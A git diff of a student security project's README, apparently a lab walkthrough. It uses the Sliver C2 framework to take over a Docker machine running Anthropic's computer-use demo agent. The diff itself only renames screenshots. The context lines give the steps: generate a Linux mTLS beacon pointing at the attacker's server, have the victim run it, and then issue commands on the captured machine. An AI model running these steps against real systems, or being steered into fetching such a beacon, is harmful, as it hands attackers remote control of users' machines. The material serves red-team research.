@@ -19,7 +19,7 @@ To begin the process, you will need an apache2 server running at an accessable l
 2. run `sliver`
 3. sliver > `sessions` will list all current sessions. Currently, this list should be empty.
 
-![screenshot](Sliver_start.png)
+![screenshot](SS!_Sliver_start.png)
 
 4. Start up the "victim" machine and start an appication that implements functions using Anthropic's computer use API. In this project, we used a docker enviroment and the demo computer use app provided by Anthropic. The instructions for starting this enviroment can be found in the [main README](https://github.com/zkoenigxd/llm-security/blob/main/README.md).
 5. sliver > `generate beacon --mtls **YOUR_SERVER_LOCATION** --os linux` will create an exicutable that will subscribe the victim to the C2 server when the file is downloaded and run.
@@ -45,7 +45,7 @@ To begin the process, you will need an apache2 server running at an accessable l
     - The info should display the name of the .exe used for the capture and the user name (by default, this demo's name is "computeruse")
 9. Run any command on the victim machine (usage can be found in the [Sliver documentation](https://sliver.sh/) or by running sliver > `help`)
 
-![screenshot](Captured_computer.png)
+![screenshot](SS10_Captured_computer.png)
 
 # Presenatation notes:
 ### My contribution to the group project:
